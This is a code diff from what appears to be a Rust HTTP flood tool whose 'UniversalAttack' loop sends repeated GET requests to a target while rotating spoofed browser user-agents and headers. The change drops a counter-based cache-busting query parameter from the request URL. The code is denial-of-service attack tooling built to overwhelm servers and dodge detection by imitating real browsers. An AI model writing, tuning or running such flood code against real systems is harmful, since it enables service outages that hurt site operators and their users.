@@ -24,8 +24,6 @@ use tracing::info;
 use phoenix_metrics::AttackMetrics;
 use crate::{Attack, AttackContext, AttackError, AttackResult};
 
-static REQ_COUNTER: AtomicU64 = AtomicU64::new(0);
-
 // ── HTTP Header pools ─────────────────────────────────────────────────────────
 static USER_AGENTS: &[&str] = &[
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
@@ -364,11 +362,9 @@ impl Attack for UniversalAttack {
                             while !stop_c.load(Ordering::Relaxed) {
                                 let fp  = &pool[fp_idx % pool_len];
                                 fp_idx  = fp_idx.wrapping_add(1);
-                                let n   = REQ_COUNTER.fetch_add(1, Ordering::Relaxed);
-                                let url = format!("{}?v={:x}", target, n);
 
                                 let t0  = Instant::now();
-                                let mut rb = client.get(&url)
+                                let mut rb = client.get(target.as_str())
                                     .header("user-agent",      fp.ua)
                                     .header("accept",          fp.accept)
                                     .header("accept-language", fp.lang)
